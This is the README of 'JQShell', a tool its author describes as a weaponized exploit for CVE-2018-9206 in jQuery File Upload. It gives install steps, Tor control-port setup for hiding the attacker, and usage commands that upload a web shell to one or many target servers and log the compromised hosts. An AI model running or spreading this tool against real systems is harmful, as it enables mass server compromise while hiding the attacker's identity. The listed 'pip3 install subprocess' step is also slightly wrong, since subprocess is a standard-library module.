![alt text](https://i.imgur.com/Gp4QkiN.png)

**JQShell** 

A weaponized version of CVE-2018-9206.

**Disclaimer**

Using this agianst servers you dont control, is illegal in most countries.
The author claims no responsibility for the actions of those who use this software for illegal purposes.
This software is intended for educational use only.
No servers were illegally pwned in the making of this software.

**Features**

*Single Target*
*Multi Target*
*Tor*

**Prerequisites**

Please install these required packages.

**Python3**

```shell
pip3 install requests pysocks subprocess stem
```
**Tor Control Port**

To use tor, in this script, you must edit your torrc file and enable tor control port on 9051.

Typically this file is here: /etc/tor/torrc

open this file and change this line:

```shell
#ControlPort 9051
```

to

```shell
ControlPort 9051
```

```shell
restart tor service
```

**Usage**

```shell
usage: jqshell.py [-h] [-l LIST_INIT] [-t SINGLE_TARGET] -s SHELL_LOC
                  [-o OUTPUTZ] [-tor]

optional arguments:
  -h, --help            show this help message and exit
  -l LIST_INIT, --list LIST_INIT
                        Select for a list of assets to exploit
  -t SINGLE_TARGET, --target SINGLE_TARGET
                        Single exploit target
  -s SHELL_LOC, --shell SHELL_LOC
                        This is required, put the fullpath to your shell
  -o OUTPUTZ, --output OUTPUTZ
                        This is full path to were you want to save your list
                        of confirmed hosts
  -tor, --tor_proxy     Select if you have tor installed, you will need to
                        enable control port
```
**Examples**

Running agianst single target.
```shell
python3 jqshell.py -t http://localhost/folderwerejqueryis -s /var/www/html/shell.php
```
Running agianst single target, with saving output.
```shell
python3 jqshell.py -t https://localhost/folderwerejqueryis -s /var/www/html/shell.php -o pwned.txt
```
Running a list, with saving output.
```shell
python3 jqshell.py -l /opt/jquery/test.txt -s /var/www/html/shell.php -o pwned.txt
```
**Author**

* **Joshua Whitaker** 
* *Twitter* [@_Stahlz](https://twitter.com/_Stahlz)
* *Email* - [stahl@stahl.io](stahl@stahl.io)
* *Website* - [stahl.io](http://stahl.io)



